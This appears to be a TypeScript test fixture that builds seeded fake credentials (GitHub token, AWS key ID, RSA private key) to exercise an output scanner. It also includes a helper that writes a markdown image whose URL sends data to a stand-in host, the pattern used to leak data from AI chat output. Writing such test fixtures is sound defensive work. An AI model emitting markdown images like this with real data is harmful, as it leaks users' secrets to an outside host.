/**
 * Fake credentials in the formats the output scanner knows, built from a
 * seeded generator so every run gets the same values and no real secret
 * appears in the source.
 */

const ALNUM = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const BASE32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
const BASE64 = `${ALNUM}+/`;

function fakeChars(seed: number, length: number, alphabet: string): string {
  // Park-Miller: the product stays below 2^53, so it is exact.
  const modulus = 2_147_483_647;
  let state = seed;
  let out = "";
  for (let i = 0; i < length; i++) {
    state = (state * 48_271) % modulus;
    out += alphabet[Math.floor((state / modulus) * alphabet.length)];
  }
  return out;
}

export function fakeGitHubToken(seed = 1): string {
  return `ghp_${fakeChars(seed, 36, ALNUM)}`;
}

export function fakeAwsKeyId(seed = 2): string {
  return `AKIA${fakeChars(seed, 16, BASE32)}`;
}

/** A PEM block with `lines` lines of 64 random base64 characters. */
export function fakePrivateKey(seed = 3, lines = 40): string {
  const body = Array.from({ length: lines }, (_, i) =>
    fakeChars(seed + i, 64, BASE64)
  ).join("\n");
  return `-----BEGIN RSA PRIVATE KEY-----\n${body}\n-----END RSA PRIVATE KEY-----`;
}

/** A markdown image whose URL carries data to a host outside any allowlist. */
export function exfiltrationImage(data: string): string {
  return `![chart](https://collector.invalid/pixel.png?d=${encodeURIComponent(data)})`;
}
